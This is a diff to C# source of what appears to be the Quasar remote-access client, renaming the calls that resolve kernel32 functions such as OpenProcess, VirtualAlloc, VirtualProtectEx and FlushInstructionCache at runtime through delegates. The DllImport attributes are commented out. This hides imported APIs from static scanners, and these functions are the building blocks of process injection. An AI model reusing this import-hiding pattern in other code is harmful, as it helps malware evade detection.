@@ -64,40 +64,40 @@ namespace Quasar.Client.Utilities
                                                 int dwLanguageId,
                                                 [Out] StringBuilder lpBuffer,
                                                 int nSize,
-                                                IntPtr lpArguments) => ClientNatives.Lookup<FormatMessageProc>("kernel32.dll", "FormatMessage")(dwFlags, lpSource, dwMessageId, dwLanguageId, lpBuffer, nSize, lpArguments);
+                                                IntPtr lpArguments) => Lookup<FormatMessageProc>("kernel32.dll", "FormatMessage")(dwFlags, lpSource, dwMessageId, dwLanguageId, lpBuffer, nSize, lpArguments);
 
         //[DllImport("kernel32.dll", SetLastError = true)]
         internal delegate IntPtr VirtualAllocProc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
         internal static IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect)
-            => ClientNatives.Lookup<VirtualAllocProc>("kernel32.dll", "VirtualAlloc")(lpAddress, dwSize, flAllocationType, flProtect);
+            => Lookup<VirtualAllocProc>("kernel32.dll", "VirtualAlloc")(lpAddress, dwSize, flAllocationType, flProtect);
 
         //[DllImport("kernel32")]
         internal delegate bool VirtualFreeProc(IntPtr lpAddress, uint dwSize, uint dwFreeType);
         internal static bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType)
-            => ClientNatives.Lookup<VirtualFreeProc>("kernel32.dll", "VirtualFree")(lpAddress, dwSize, dwFreeType);
+            => Lookup<VirtualFreeProc>("kernel32.dll", "VirtualFree")(lpAddress, dwSize, dwFreeType);
 
         //[DllImport("kernel32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         internal delegate bool IsWow64ProcessProc([In] IntPtr hProcess, [Out] out bool lpSystemInfo);
-        internal static bool IsWow64Process([In] IntPtr hProcess, [Out] out bool lpSystemInfo) => ClientNatives.Lookup<IsWow64ProcessProc>("kernel32.dll", "IsWow64Process")(hProcess, out lpSystemInfo);
+        internal static bool IsWow64Process([In] IntPtr hProcess, [Out] out bool lpSystemInfo) => Lookup<IsWow64ProcessProc>("kernel32.dll", "IsWow64Process")(hProcess, out lpSystemInfo);
 
         //[DllImport("kernel32.dll", SetLastError = true)]
         internal delegate int GetThreadIdProc(IntPtr threadHandle);
-        internal static int GetThreadId(IntPtr threadHandle) => ClientNatives.Lookup<GetThreadIdProc>("kernel32.dll", "GetThreadId")(threadHandle);
+        internal static int GetThreadId(IntPtr threadHandle) => Lookup<GetThreadIdProc>("kernel32.dll", "GetThreadId")(threadHandle);
 
         //[DllImport("kernel32.dll")]
         internal delegate uint GetCurrentThreadIdProc();
-        internal static uint GetCurrentThreadId() => ClientNatives.Lookup<GetCurrentThreadIdProc>("kernel32.dll", "GetCurrentThreadId")();
+        internal static uint GetCurrentThreadId() => Lookup<GetCurrentThreadIdProc>("kernel32.dll", "GetCurrentThreadId")();
 
         //[DllImport("kernel32.dll", SetLastError = true)]
         internal delegate IntPtr OpenProcessProc([In] ProcessAccessRights dwDesiredAccess, [In, MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, [In] int dwProcessId);
         internal static IntPtr OpenProcess([In] ProcessAccessRights dwDesiredAccess, [In, MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, [In] int dwProcessId)
-            => ClientNatives.Lookup<OpenProcessProc>("kernel32.dll", "OpenProcess")(dwDesiredAccess, bInheritHandle, dwProcessId);
+            => Lookup<OpenProcessProc>("kernel32.dll", "OpenProcess")(dwDesiredAccess, bInheritHandle, dwProcessId);
 
         //[DllImport("kernel32.dll", SetLastError = true)]
         internal delegate IntPtr OpenThreadProc([In] ThreadAccessRights dwDesiredAccess, [In, MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, [In] int dwProcessId);
         internal static IntPtr OpenThread([In] ThreadAccessRights dwDesiredAccess, [In, MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, [In] int dwProcessId)
-            => ClientNatives.Lookup<OpenThreadProc>("kernel32.dll", "OpenThread")(dwDesiredAccess, bInheritHandle, dwProcessId);
+            => Lookup<OpenThreadProc>("kernel32.dll", "OpenThread")(dwDesiredAccess, bInheritHandle, dwProcessId);
 
         //[DllImport("kernel32.dll")]
         internal delegate bool TerminateThread(IntPtr hThread, uint dwExitCode);
@@ -119,7 +119,7 @@ namespace Quasar.Client.Utilities
             [Out] out IntPtr lpTargetHandle,
             [In] int dwDesiredAccess,
             [In, MarshalAs(UnmanagedType.Bool)] bool bInheritHandle,
-            [In] DuplicateHandleOptions dwOptions) => ClientNatives.Lookup<DuplicateHandleProc>("kernel32.dll", "DuplicateHandle")(
+            [In] DuplicateHandleOptions dwOptions) => Lookup<DuplicateHandleProc>("kernel32.dll", "DuplicateHandle")(
                 hSourceProcessHandle,
                 hSourceHandle,
                 hTargetProcessHandle,
@@ -130,21 +130,21 @@ namespace Quasar.Client.Utilities
 
         //[DllImport("kernel32.dll")]
         internal delegate IntPtr GetCurrentProcessProc();
-        internal static IntPtr GetCurrentProcess() => ClientNatives.Lookup<GetCurrentProcessProc>("kernel32.dll", "GetCurrentProcess")();
+        internal static IntPtr GetCurrentProcess() => Lookup<GetCurrentProcessProc>("kernel32.dll", "GetCurrentProcess")();
 
         //[DllImport("kernel32.dll")]
         internal delegate int GetCurrentProcessIdProc();
-        internal static int GetCurrentProcessId() => ClientNatives.Lookup<GetCurrentProcessIdProc>("kernel32.dll", "GetCurrentProcessId")();
+        internal static int GetCurrentProcessId() => Lookup<GetCurrentProcessIdProc>("kernel32.dll", "GetCurrentProcessId")();
 
         //[DllImport("kernel32.dll", SetLastError = true)]
         internal delegate int GetProcessIdProc([In] IntPtr Process);
-        internal static int GetProcessId([In] IntPtr Process) => ClientNatives.Lookup<GetProcessIdProc>("kernel32.dll", "GetProcessId")(Process);
+        internal static int GetProcessId([In] IntPtr Process) => Lookup<GetProcessIdProc>("kernel32.dll", "GetProcessId")(Process);
 
         //[DllImport("kernel32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         internal delegate bool CloseHandleProc([In] IntPtr hObject);
         [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
-        internal static bool CloseHandle([In] IntPtr hObject) => ClientNatives.Lookup<CloseHandleProc>("kernel32.dll", "CloseHandle")(hObject);
+        internal static bool CloseHandle([In] IntPtr hObject) => Lookup<CloseHandleProc>("kernel32.dll", "CloseHandle")(hObject);
 
         //[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
         internal delegate int QueryDosDeviceProc(
@@ -154,25 +154,25 @@ namespace Quasar.Client.Utilities
         internal static int QueryDosDevice(
             [In] string lpDeviceName,
             [Out] StringBuilder lpTargetPath,
-            [In] int ucchMax) => ClientNatives.Lookup<QueryDosDeviceProc>("kernel32.dll", "QueryDosDevice")(lpDeviceName, lpTargetPath, ucchMax);
+            [In] int ucchMax) => Lookup<QueryDosDeviceProc>("kernel32.dll", "QueryDosDevice")(lpDeviceName, lpTargetPath, ucchMax);
 
         //[DllImport("kernel32.dll", SetLastError = true)]
 
         internal delegate void GetSystemInfoProc(ref SYSTEM_INFO Info);
-        internal static void GetSystemInfo(ref SYSTEM_INFO Info) => ClientNatives.Lookup<GetSystemInfoProc>("kernel32.dll", "GetSystemInfo")(ref Info);
+        internal static void GetSystemInfo(ref SYSTEM_INFO Info) => Lookup<GetSystemInfoProc>("kernel32.dll", "GetSystemInfo")(ref Info);
 
         //[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
         internal delegate void OutputDebugStringProc(string lpOutputString);
-        internal static void OutputDebugString(string lpOutputString) => ClientNatives.Lookup<OutputDebugStringProc>("kernel32.dll", "OutputDebugString")(lpOutputString);
+        internal static void OutputDebugString(string lpOutputString) => Lookup<OutputDebugStringProc>("kernel32.dll", "OutputDebugString")(lpOutputString);
 
         //[DllImport("kernel32.dll")]
         internal delegate bool VirtualProtectExProc(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, PageAccessRights flNewProtect, out PageAccessRights lpflOldProtect);
         internal static bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, PageAccessRights flNewProtect, out PageAccessRights lpflOldProtect)
-            => ClientNatives.Lookup<VirtualProtectExProc>("kernel32.dll", "VirtualProtectEx")(hProcess, lpAddress, dwSize, flNewProtect, out lpflOldProtect);
+            => Lookup<VirtualProtectExProc>("kernel32.dll", "VirtualProtectEx")(hProcess, lpAddress, dwSize, flNewProtect, out lpflOldProtect);
 
         //[DllImport("kernel32.dll")]
         internal delegate bool FlushInstructionCacheProc(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
         internal static bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize)
-            => ClientNatives.Lookup<FlushInstructionCacheProc>("kernel32.dll", "FlushInstructionCache")(hProcess, lpBaseAddress, dwSize);
+            => Lookup<FlushInstructionCacheProc>("kernel32.dll", "FlushInstructionCache")(hProcess, lpBaseAddress, dwSize);
     }
 }
